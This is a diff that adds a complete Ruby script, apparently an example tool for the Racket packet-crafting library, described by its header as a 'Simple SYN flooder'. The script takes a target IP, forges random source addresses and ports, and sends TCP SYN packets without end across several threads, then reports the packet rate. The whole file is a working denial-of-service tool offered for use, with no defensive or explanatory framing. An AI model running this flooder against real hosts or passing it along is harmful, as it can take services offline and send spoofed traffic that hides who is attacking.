@@ -1,0 +1,147 @@
+#!/usr/bin/ruby
+# $Id$
+# Simple SYN flooder with randomness built in, using Racket
+# Use at your own risk
+# 
+# Jon Hart <jhart@spoofed.org>
+
+require 'rubygems'
+require 'racket'
+require 'monitor'
+require 'optparse'
+require 'ostruct'
+
+include Racket
+
+class Options
+  def self.parse(name, args)
+    options = OpenStruct.new
+    options.verbose = false
+    options.srcport = nil 
+    options.dstport = nil
+    options.srcip = nil
+    options.dstip = nil
+    options.packets = nil
+    options.threads = 1
+
+    opts = OptionParser.new do |opts|
+      opts.banner = "#{File.basename(name)}"
+      opts.banner += "Usage: #{name} [options]"
+
+      opts.on("--srcip SOURCEIP", "Source IP address (default: random)") do |o|
+        options.srcip = o
+      end
+
+      opts.on("--dstip DESTIP", "Destination IP address (required)") do |o|
+        options.dstip = o
+      end
+
+      opts.on("--srcport SRCPORT", "Source port (default: random)") do |o|
+        options.srcport = o.to_i
+      end
+
+      opts.on("--dstport DSTPORT", "Destination port (default: random)") do |o|
+        options.dstport = o.to_i
+      end
+
+      opts.on("--threads NUMTHREADS", "Number of writing threads (default: 1)") do |o|
+        options.threads = o.to_i
+      end
+
+      opts.on("--packets NUMPACKETS", "Number of packets to send (default: infinite)") do |o|
+        options.packets = o.to_i
+      end
+      opts.on_tail("-h", "--help", "Show this help message.") { puts opts; exit }
+    end
+
+
+    begin
+      opts.parse!(args)
+    rescue OptionParser::ParseError => e
+      puts "#{e}\n\n#{opts}"
+      exit(1)
+    end
+    options.help = opts
+    options
+  end
+end
+
+@options = Options.parse($0, ARGV)
+
+if (@options.dstip.nil?) 
+  puts "Destination IP required"
+  puts @options.help
+  exit(1)
+end
+
+
+@p = Racket::Racket.new
+@p.iface = "eth0"
+
+@p.l3 = IPv4.new
+@p.l3.src_ip = @options.srcip.nil? ? "0.0.0.0" : @options.srcip
+@p.l3.dst_ip = @options.dstip.nil? ? "0.0.0.0" : @options.dstip
+@p.l3.protocol = 6
+
+@p.l4 = TCP.new
+@p.l4.dst_port = @options.dstport.nil? ? 0 : @options.dstport
+@p.l4.src_port = @options.srcport.nil? ? 0 : @options.srcport
+@p.l4.flag_syn = 1
+
+t1 = Time.new
+i = 0
+
+class Flood < Monitor
+  attr_reader :count
+  def initialize
+    @count = 0
+    super
+  end
+
+  def flood(packet, options)
+    @packet = packet
+    @options = options
+    begin
+      if ( (! @options.packets.nil?) && @options.packets < @count)  
+        break
+      end
+
+      if (@options.srcip.nil?)
+        @packet.l3.src_ip = L3::Misc.long2ipv4(rand(2**32))
+      end
+
+      if (@options.srcport.nil?)
+        @packet.l4.src_port = 1024 + rand(65535-1024)
+      end
+
+      if (@options.dstport.nil?)
+        @packet.l4.dst_port = 1024 + rand(65535-1024)
+      end
+
+      @packet.l4.fix!(@packet.l3.src_ip, @packet.l3.dst_ip, "")
+
+      synchronize do
+        @count += 1
+        @packet.sendpacket
+      end
+    end while (true)
+  end
+end
+
+
+t1 = Time.new
+f = Flood.new
+threads = []
+(1.upto(@options.threads)).each do |t|
+  threads << Thread.new { f.flood(@p, @options) }
+end
+
+threads.each do |t|
+  t.join
+end
+t2 = Time.new
+
+time = t2 - t1
+
+puts "Sent #{f.count} packets in #{time} seconds (#{"%.0f" % (f.count/time).to_f} pps)"
+
